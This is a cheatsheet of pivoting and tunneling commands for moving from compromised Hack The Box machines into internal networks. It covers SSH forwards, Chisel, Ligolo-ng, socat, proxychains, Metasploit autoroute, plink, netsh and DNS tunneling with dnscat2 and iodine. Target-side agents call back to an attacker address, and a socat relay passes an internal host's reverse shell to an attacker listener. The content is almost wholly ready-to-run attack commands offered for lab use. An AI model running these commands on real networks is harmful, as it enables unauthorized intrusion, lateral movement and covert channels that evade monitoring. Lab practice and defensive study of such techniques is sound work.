# Pivoting & Tunneling Cheatsheet

Techniques for reaching internal networks through compromised HTB machines.

## SSH Tunneling

```bash
# Local port forward (access remote service locally)
ssh -L 8080:127.0.0.1:80 user@10.10.10.X
# Now access: http://127.0.0.1:8080

# Remote port forward (expose local service to target)
ssh -R 4444:127.0.0.1:4444 user@10.10.10.X
# Target can now reach your listener at 127.0.0.1:4444

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@10.10.10.X
# Configure proxychains: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn internal_host

# Double pivot
ssh -L 2222:internal1:22 user@10.10.10.X
ssh -L 8080:internal2:80 -p 2222 user2@127.0.0.1

# SSH over jump host
ssh -J user@10.10.10.X user2@internal_host
```

## Chisel

```bash
# Attacker (server)
chisel server -p 8080 --reverse

# Target (client) - SOCKS proxy
./chisel client 10.10.14.X:8080 R:socks
# Creates SOCKS5 on attacker port 1080
# Configure proxychains: socks5 127.0.0.1 1080

# Target (client) - Port forward
./chisel client 10.10.14.X:8080 R:8888:127.0.0.1:80
# Forwards target's 127.0.0.1:80 to attacker's 8888

# Target (client) - Multiple forwards
./chisel client 10.10.14.X:8080 R:8888:internal:80 R:9999:internal:443
```

## Ligolo-ng

```bash
# Attacker - Start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Target - Start agent
./agent -connect 10.10.14.X:11601 -ignore-cert

# In ligolo proxy console:
session           # Select the session
ifconfig          # View target's interfaces

# Add route to internal network
sudo ip route add 172.16.0.0/24 dev ligolo

# Start tunnel
start

# Now access internal network directly
nmap -sT -Pn 172.16.0.10
```

## Socat

```bash
# Port forward
socat TCP-LISTEN:8080,fork TCP:internal_host:80

# Port forward with bind
socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:127.0.0.1:80

# Reverse connection relay
# Attacker: nc -lvnp 4444
# Pivot host:
socat TCP-LISTEN:9999,fork TCP:10.10.14.X:4444
# Internal host reverse shell to pivot:9999 -> forwarded to attacker:4444
```

## Proxychains

```bash
# Config: /etc/proxychains4.conf
# Add at bottom:
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT -Pn 172.16.0.10
proxychains curl http://172.16.0.10
proxychains ssh user@172.16.0.10
proxychains evil-winrm -i 172.16.0.10 -u admin -p pass

# Scan through proxy (fast)
proxychains -q nmap -sT -Pn -T4 --top-ports 100 172.16.0.10
```

## Metasploit Pivoting

```bash
# Add route through meterpreter session
meterpreter> run autoroute -s 172.16.0.0/24

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Port forward
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.0.10
```

## plink.exe (Windows SSH client)

```powershell
# Local port forward
plink.exe -L 8080:127.0.0.1:80 user@10.10.14.X

# Remote port forward
plink.exe -R 4444:127.0.0.1:4444 user@10.10.14.X

# Dynamic (SOCKS)
plink.exe -D 1080 user@10.10.14.X
```

## netsh (Windows built-in)

```powershell
# Port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.0.10

# List forwards
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

## DNS Tunneling

```bash
# dnscat2
# Server (attacker):
dnscat2-server tunnel.domain.com

# Client (target):
./dnscat2 tunnel.domain.com

# iodine
# Server:
iodined -f -c -P password 10.0.0.1 tunnel.domain.com
# Client:
iodine -f -P password tunnel.domain.com
```
